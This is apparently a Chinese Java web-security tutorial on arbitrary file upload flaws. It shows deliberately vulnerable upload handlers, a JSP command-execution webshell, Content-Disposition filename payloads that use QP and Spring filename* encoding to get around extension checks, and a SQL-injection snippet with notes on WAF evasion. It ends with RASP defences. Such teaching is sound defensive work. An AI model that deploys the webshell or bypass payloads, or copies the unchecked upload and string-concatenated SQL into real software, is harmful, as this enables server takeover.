# 任意文件上传漏洞

Web应用通常都会包含文件上传功能，用户可以将其本地的文件上传到Web服务器上。如果服务器端没有能够正确的检测用户上传的文件类型是否合法(例如上传了`jsp`后缀的`WebShell`)就将文件写入到服务器中就可能会导致服务器被非法入侵。



## 1. Apache commons fileupload文件上传测试

`Apache commons-fileupload`是一个非常常用的文件上传解析库，`Spring MVC`、`Struts2`、`Tomcat`等底层处理文件上传请求都是使用的这个库。

**示例 - Apache commons-fileupload文件上传：**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.commons.fileupload.FileItemIterator" %>
<%@ page import="org.apache.commons.fileupload.FileItemStream" %>
<%@ page import="org.apache.commons.fileupload.servlet.ServletFileUpload" %>
<%@ page import="org.apache.commons.fileupload.util.Streams" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileOutputStream" %>
<%
    if (ServletFileUpload.isMultipartContent(request)) {
        ServletFileUpload fileUpload       = new ServletFileUpload();
        FileItemIterator  fileItemIterator = fileUpload.getItemIterator(request);

        String dir       = request.getServletContext().getRealPath("/uploads/");
        File   uploadDir = new File(dir);

        if (!uploadDir.exists()) {
            uploadDir.mkdir();
        }

        while (fileItemIterator.hasNext()) {
            FileItemStream fileItemStream = fileItemIterator.next();
            String         fieldName      = fileItemStream.getFieldName();// 字段名称

            if (fileItemStream.isFormField()) {
                String fieldValue = Streams.asString(fileItemStream.openStream());// 字段值
                out.println(fieldName + "=" + fieldValue);
            } else {
                String fileName   = fileItemStream.getName();
                File   uploadFile = new File(uploadDir, fileName);
                out.println(fieldName + "=" + fileName);
                FileOutputStream fos = new FileOutputStream(uploadFile);

                // 写文件
                Streams.copy(fileItemStream.openStream(), fos, true);

                out.println("文件上传成功:" + uploadFile.getAbsolutePath());
            }
        }
    } else {
%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File upload</title>
</head>
<body>
<form action="" enctype="multipart/form-data" method="post">
    <p>
        用户名: <input name="username" type="text"/>
        文件: <input id="file" name="file" type="file"/>
    </p>
    <input name="submit" type="submit" value="Submit"/>
</form>
</body>
</html>
<%
    }
%>
```

**示例 - 本地命令执行后门代码：**

```jsp
<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<pre>
<%
    String[] cmd = request.getParameterValues("cmd");
    Process process = Runtime.getRuntime().exec(cmd);
    InputStream in = process.getInputStream();
    int a = 0;
    byte[] b = new byte[1024];

    while ((a = in.read(b)) != -1) {
        out.println(new String(b, 0, a));
    }

    in.close();
%>
</pre>
```

因为Web应用未检测用户上传的文件合法性导致了任意文件上传漏洞，访问示例中的文件上传地址：[http://localhost:8000/modules/servlet/fileupload/file-upload.jsp](http://localhost:8000/modules/servlet/fileupload/file-upload.jsp)，并选择一个恶意的jsp后门(示例上传的是一个本地命令执行的后门):

![img](https://oss.javasec.org/images/image-20200921003740246.png)

后门成功的写入到了网站目录：

![image-20200921003719254](https://oss.javasec.org/images/image-20200921003719254.png)

访问命令执行后门测试：[http://localhost:8000/uploads/cmd.jsp?cmd=ls](http://localhost:8000/uploads/cmd.jsp?cmd=ls)，如下图：

![img](https://oss.javasec.org/images/image-20200921003841786.png)

## 2. Servlet 3.0 内置文件上传解析

Servlet3.0 新增了对文件上传请求解析的支持，`javax.servlet.http.HttpServletRequest#getParts`，使用`request.getParts();`即可获取文件上传包解析后的结果，从此不再需要使用第三方jar来处理文件上传请求了。



### 2.1 JSP multipart-config

JSP使用`request.getParts();`必须配置`multipart-config`，否则请求时会报错：`Unable to process parts as no multi-part configuration has been provided`（由于没有提供multi-part配置，无法处理parts）。

在web.xml中添加如下配置：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="3.0"
         xmlns="http://java.sun.com/xml/ns/javaee"
         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd">
         
   <servlet>
        <servlet-name>file-upload-parts.jsp</servlet-name>
        <jsp-file>/modules/servlet/fileupload/file-upload-parts.jsp</jsp-file>
        <multipart-config>
            <max-file-size>1000000</max-file-size>
            <max-request-size>1000000</max-request-size>
            <file-size-threshold>1000000</file-size-threshold>
        </multipart-config>
    </servlet>

    <servlet-mapping>
        <servlet-name>file-upload-parts.jsp</servlet-name>
        <url-pattern>/modules/servlet/fileupload/file-upload-parts.jsp</url-pattern>
    </servlet-mapping>
    
</web-app>
```

**示例 - file-upload-parts.jsp**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.commons.io.IOUtils" %>
<%@ page import="java.util.Collection" %>
<%@ page import="java.io.File" %>
<%
    String contentType = request.getContentType();

    // 检测是否是multipart请求
    if (contentType != null && contentType.startsWith("multipart/")) {
        String dir       = request.getSession().getServletContext().getRealPath("/uploads/");
        File   uploadDir = new File(dir);

        if (!uploadDir.exists()) {
            uploadDir.mkdir();
        }

        Collection<Part> parts = request.getParts();

        for (Part part : parts) {
            String fileName = part.getSubmittedFileName();

            if (fileName != null) {
                File uploadFile = new File(uploadDir, fileName);
                out.println(part.getName() + ": " + uploadFile.getAbsolutePath() + "<br/>");
            } else {
                out.println(part.getName() + ": " + IOUtils.toString(part.getInputStream()) + "<br/>");
            }
        }
    } else {
%>
<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>File upload</title>
</head>
<body>
<form action="" enctype="multipart/form-data" method="post">
    <p>
        用户名: <input name="username" type="text"/>
        文件: <input id="file" name="file" type="file"/>
    </p>
    <input name="submit" type="submit" value="Submit"/>
</form>
</body>
</html>
<%
    }
%>
```

访问示例中的文件上传地址：[http://localhost:8000/modules/servlet/fileupload/file-upload-parts.jsp](http://localhost:8000/modules/servlet/fileupload/file-upload-parts.jsp)：

![img](https://oss.javasec.org/images/image-20201118150151152.png)

文件上传成功：

![img](https://oss.javasec.org/images/image-20201118150626809.png)

### 2.2 Servlet @MultipartConfig

Servlet3.0 需要配置`@MultipartConfig`注解才能支持`multipart`解析。

**示例 - FileUploadServlet代码：**

```java
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Collection;

@MultipartConfig
@WebServlet(urlPatterns = "/FileUploadServlet")
public class FileUploadServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        PrintWriter out = resp.getWriter();

        out.println("<!DOCTYPE html>\n" +
                "<html lang=\"zh\">\n" +
                "<head>\n" +
                "    <meta charset=\"UTF-8\">\n" +
                "    <title>File upload</title>\n" +
                "</head>\n" +
                "<body>\n" +
                "<form action=\"\" enctype=\"multipart/form-data\" method=\"post\">\n" +
                "    <p>\n" +
                "        用户名: <input name=\"username\" type=\"text\"/>\n" +
                "        文件: <input id=\"file\" name=\"file\" type=\"file\"/>\n" +
                "    </p>\n" +
                "    <input name=\"submit\" type=\"submit\" value=\"Submit\"/>\n" +
                "</form>\n" +
                "</body>\n" +
                "</html>");

        out.flush();
        out.close();
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        PrintWriter out         = response.getWriter();
        String      contentType = request.getContentType();

        // 检测是否是multipart请求
        if (contentType != null && contentType.startsWith("multipart/")) {
            String dir       = request.getSession().getServletContext().getRealPath("/uploads/");
            File   uploadDir = new File(dir);

            if (!uploadDir.exists()) {
                uploadDir.mkdir();
            }

            Collection<Part> parts = request.getParts();

            for (Part part : parts) {
                String fileName = part.getSubmittedFileName();

                if (fileName != null) {
                    File uploadFile = new File(uploadDir, fileName);
                    out.println(part.getName() + ": " + uploadFile.getAbsolutePath());

                    FileUtils.write(uploadFile, IOUtils.toString(part.getInputStream(), "UTF-8"));
                } else {
                    out.println(part.getName() + ": " + IOUtils.toString(part.getInputStream()));
                }
            }
        }

        out.flush();
        out.close();
    }

}
```

访问示例中的文件上传地址：[http://localhost:8000/FileUploadServlet](http://localhost:8000/FileUploadServlet)

![img](https://oss.javasec.org/images/image-20201118153002485.png)

文件上传成功：

![img](https://oss.javasec.org/images/image-20201118153018149.png)



## 3. Spring MVC文件上传

Spring MVC会自动解析`multipart/form-data`请求，将`multipart`中的对象封装到`MultipartRequest`对象中，所以在Controller中使用`@RequestParam`注解就可以映射`multipart`中的对象了，如：`@RequestParam("file") MultipartFile file`。

```java
import org.javaweb.utils.FileUtils;
import org.javaweb.utils.HttpServletResponseUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.Map;

import static org.javaweb.utils.HttpServletRequestUtils.getDocumentRoot;

@Controller
@RequestMapping("/FileUpload/")
public class FileUploadController {

    @RequestMapping("/upload.php")
    public void uploadPage(HttpServletResponse response) {
        HttpServletResponseUtils.responseHTML(response, "<!DOCTYPE html>\n" +
                "<html lang=\"en\">\n" +
                "<head>\n" +
                "    <meta charset=\"UTF-8\">\n" +
                "    <title>File upload</title>\n" +
                "</head>\n" +
                "<body>\n" +
                "<form action=\"/FileUpload/upload.do\" enctype=\"multipart/form-data\" method=\"post\">\n" +
                "    <p>\n" +
                "        用户名: <input name=\"username\" type=\"text\"/>\n" +
                "        文件: <input id=\"file\" name=\"file\" type=\"file\"/>\n" +
                "    </p>\n" +
                "    <input name=\"submit\" type=\"submit\" value=\"Submit\"/>\n" +
                "</form>\n" +
                "</body>\n" +
                "</html>");
    }

    @ResponseBody
    @RequestMapping("/upload.do")
    public Map<String, Object> upload(String username, @RequestParam("file") MultipartFile file, HttpServletRequest request) {
        // 文件名称
        String filePath   = "uploads/" + username + "/" + file.getOriginalFilename();
        File   uploadFile = new File(getDocumentRoot(request), filePath);

        // 上传目录
        File uploadDir = uploadFile.getParentFile();

        // 上传文件对象
        Map<String, Object> jsonMap = new LinkedHashMap<String, Object>();

        if (!uploadDir.exists()) {
            uploadDir.mkdirs();
        }

        try {
            FileUtils.copyInputStreamToFile(file.getInputStream(), uploadFile);

            jsonMap.put("url", filePath);
            jsonMap.put("msg", "上传成功!");
        } catch (IOException e) {
            jsonMap.put("msg", "上传失败，服务器异常!");
        }

        return jsonMap;
    }

}
```

访问示例中的文件上传地址：[http://localhost:8000/FileUpload/upload.do](http://localhost:8000/FileUpload/upload.do)，如下图：

![img](https://oss.javasec.org/images/image-20201116154250929.png)

后门成功的写入到了网站目录：

![img](https://oss.javasec.org/images/image-20201116154312441.png)

## 4. 文件上传 - 编码特性

### 4.1 QP编码

[QP编码](https://zh.wikipedia.org/wiki/Quoted-printable)（ `quoted-printable`）是邮件协议中的一种内容编码方式，`Quoted-printable`是使用可打印的ASCII字符（如字母、数字与“=”）表示各种编码格式下的字符，以便能在7-bit数据通路上传输8-bit数据, 或者更一般地说在非8-bit clean媒体上正确处理数据，这被定义为MIME [content transfer encoding](https://zh.wikipedia.org/wiki/MIME#Content-Transfer-Encoding)。

**示例 - JavaQP编码代码：**

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.mail.internet.MimeUtility" %>
<%
    String qp = request.getParameter("qp");
    String encode = MimeUtility.encodeWord(qp);
    String decode = MimeUtility.decodeWord(encode);

    out.println("<pre>\nQP-Encoding: " + encode + "\nQP-Decode: " + decode);
%>
```

字符串：`测试.jsp`编码后的结果如下：

![img](https://oss.javasec.org/images/image-20201119110638971.png)

QP编码本与文件上传没有什么关系，但是由于在Java中最常用的[Apache commons fileupload](http://commons.apache.org/proper/commons-fileupload/)库从1.3开始支持了[RFC 2047](https://www.ietf.org/rfc/rfc2047.txt) Header值编码，从而支持解析使用QP编码后的文件名。

上传文件的时候选一个文件名经过QP编码后的文件，如：`=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?=`（测试.jsp）。

**示例 - 文件上传测试：**

![img](https://oss.javasec.org/images/image-20201118171038557.png)

**示例 - Payload：**

```java
Content-Disposition: form-data; name="file"; filename="=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?="
```

编码处理类：`org.apache.commons.fileupload.util.mime.MimeUtility#decodeText`

![img](https://oss.javasec.org/images/image-20201116182555363.png)

文件上传成功后文件名被编码成了`测试.jsp`。

Spring MVC中同样支持QP编码，在Spring中有两种处理`Multipart`的`Resolver`： `org.springframework.web.multipart.commons.CommonsMultipartResolver`和`org.springframework.web.multipart.support.StandardServletMultipartResolver`。`CommonsMultipartResolver`使用的是`commons fileupload`解析的所以支持QP编码。`StandardMultipartHttpServletRequest`比较特殊，Spring 4没有处理QP编码：

![img](https://oss.javasec.org/images/image-20201116190648714.png)

但是在Spring 5修改了实现，如果文件名是`=?`开始`?=`结尾的话会调用`javax.mail`库的`MimeDelegate`解析QP编码：

![img](https://oss.javasec.org/images/image-20201116190416499.png)



`javax.mail`库不是JDK自带的，必须自行引包，如果不存在该包也将无法解析，SpringBoot + Spring4默认使用的是`StandardServletMultipartResolver`，但是基于配置的Spring MVC中经常会使用`CommonsMultipartResolver`，如：

```xml
<bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver">
    <property name="defaultEncoding" value="UTF-8"></property>
    <property name="maxUploadSize" value="50000000"></property>
    <property name="maxInMemorySize" value="1024"></property>
</bean>
```



### 4.2 Spring 内置文件名编码特性

Spring会对文件上传的名称做特殊的处理，`org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest`内置了一种比较特殊的解析文件名的方式，如果传入的`multipart`请求无法直接使用`filename=`解析出文件名，Spring还会使用`content-disposition`解析一次（使用`filename*=`解析文件名）。

在文件上传时，修改`Content-Disposition`中的`filename=`为`filename*="UTF-8'1.jpg'1.jsp"`：

![img](https://oss.javasec.org/images/image-20201116202636853.png)

Spring4的`org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest`解析逻辑：

![img](https://oss.javasec.org/images/image-20201116200619169.png)

Spring4的`org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#extractFilenameWithCharset`代码如下：

![img](https://oss.javasec.org/images/image-20201116200313346.png)

`extractFilenameWithCharset`支持对传入的文件名编码，示例中传入的`UTF-8'1.jpg'1.jsp`会被解析成`UTF-8`编码，最终的文件名为`1.jsp`，而`1.jpg`则会被丢弃。

Spring5的`org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest`除了支持QP编码以外，优化了Spring4的解析文件名的方式：

![img](https://oss.javasec.org/images/image-20201116202343036.png)

`org.springframework.http.ContentDisposition#parse`代码：

![img](https://oss.javasec.org/images/image-20201116202037704.png)

文件上传成功：

![img](https://oss.javasec.org/images/image-20201116202909113.png)

**示例 - Payload：**

```java
Content-Disposition: form-data; name="file"; filename*="1.jsp"
Content-Disposition: form-data; name="file"; filename*="UTF-8'1.jpg'1.jsp"
Content-Disposition: form-data; name="file"; filename*="UTF-8'1.jpg'=?UTF-8?Q?=E6=B5=8B=E8=AF=95=2Ejsp?="
```



## 5. Multipart字段解析问题

在2013年左右，测试过非常多的WAF都不支持Multipart解析，当时经常使用Multipart请求方式来绕过WAF。Multipart所以使用请求与普通的GET/POST参数传输有非常大的区别，因为Multipart请求需要后端Web应用解析该请求包，Web容器也不会解析Multipart请求。WAF可能会解析Multipart但是很多时候可以直接绕过，比如很多WAF无法处理一个数据量较大的Multipart请求或者解析Multipart时不标准导致绕过。

在PHP中默认会解析Multipart请求，也就是说我们除了可以以GET/POST方式传参，还可以使用发送Multipart请求，后端一样可以接受到Multipart中的参数。在Java的MVC框架中Spring MVC、Struts2等实现了和PHP类似的功能，当框架发现请求方式是Multipart时就会主动的解析并将解析结果封装到`HttpServletRequest`中。

**示例 - Spring MVC 注入代码片段：**

```java
@ResponseBody
@RequestMapping("/getArticleById.php")
public SysArticle getArticleByID(String id) {
        return jdbcTemplate.queryForObject(
                "select * from sys_article where id = " + id,
                BeanPropertyRowMapper.newInstance(SysArticle.class)
        );
}
```

访问示例程序：[http://localhost:8000/getArticleById.php?id=100000](http://localhost:8000/getArticleById.php?id=100000)：

![img](https://oss.javasec.org/images/image-20201118160422872.png)

使用`Multipart`请求注入数据库信息测试：

![img](https://oss.javasec.org/images/image-20201118161532459.png)



## 6. RASP防御恶意文件上传攻击

RASP不但应该防御`Apache commons-fileupload`库的文件上传请求，还应当支持Servlet 3.0新增的`javax.servlet.http.Part`。当检测到请求的文件名称包含了动态脚本文件（如：`.jsp/.jspx/.jspf/.jspa/.php/.asp/.aspx`等）的 时候需要立即拦截文件上传请求。

### 6.1 Apache commons fileupload 防御

`Apache commons-fileupload`底层处理解析Multipart的类是`org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl.FileItemStreamImpl`，如下：

![img](https://oss.javasec.org/images/image-20201118163055865.png)

只需Hook `FileItemStreamImpl`类的构造方法就可以获取到`Multipart`的字段或者文件名称，RASP只需要检测传入的`pName`参数值`cmd.jsp`是否是一个合法的文件名称就可以实现文件上传校验了。

![img](https://oss.javasec.org/images/image-20201118163440860.png)

需要注意一点，Tomcat封装了`Apache commons fileupload`库，并修改了fileupload类的包名，如：`org.apache.tomcat.util.http.fileupload.FileUploadBase.FileItemIteratorImpl.FileItemStreamImpl#FileItemStreamImpl`，所以应当把这个类也放入检测范围内。



### 6.2 javax.servlet.http.Part防御

`javax.servlet.http.Part`是一个接口，不同的容器实现可能都不一样，RASP可以对`javax.servlet.http.Part`接口的`getInputStream`方法进行Hook，然后调用`getName`和`getSubmittedFileName`就可以获取到字段名称、文件名等信息。

![img](https://oss.javasec.org/images/image-20201118165015405.png)

![img](https://oss.javasec.org/images/image-20201118165504047.png)

需要特别注意的是`Jakarta EE8`修改了`javax.servlet.http.Part`的API包名为：`jakarta.servlet.http.Part`，为了能够适配高版本的`Jakarta` API。

### 6.3 Spring MVC文件名内置编码支持

RASP为了更好的防御文件上传类请求，需要支持[RFC 2047](https://www.ietf.org/rfc/rfc2047.txt)的QP编码，还需要支持对Spring MVC内置的文件名编码处理处理。

![img](https://oss.javasec.org/images/image-20201118170855641.png)

